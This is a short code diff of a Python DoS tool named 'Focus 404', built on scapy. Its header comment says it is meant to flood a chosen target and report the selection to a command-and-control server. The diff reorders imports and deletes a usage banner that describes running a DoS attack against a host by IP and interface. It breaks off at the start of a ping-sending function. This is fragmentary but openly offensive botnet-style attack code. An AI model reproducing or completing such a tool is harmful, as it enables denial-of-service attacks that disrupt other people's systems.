@@ -1,29 +1,12 @@
 # Focus 404 is intended to dos a specific target and then report back to the CNC which target was selected
 import getopt
-import sys
 import logging
+import sys
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 from scapy.all import *
 import time
 import multiprocessing
 from multiprocessing import Process
-
-def usage(): 
-	print (
-"""
-Focus 404 DoS Tool
-AT ANY TIME TO STOP ATTACK HIT Ctrl+C
-Usage: python focus404.py -t target_host -i interface
-
-  -t --target   	-Execute a DoS attack against [host]
-  -h --help 		-Shows the help page for focus404
-  -i --interface 	-The interface that you want to use to send packets
-  -p --pingers		-Number of pinger processes to spawn
-
-Example(s):
-python project404.py -t 192.168.1.1 -i enp2s0
-""")
-	sys.exit(0)
 
 def sendPings(destIp, interface):
 	s = conf.L3socket(iface=interface)
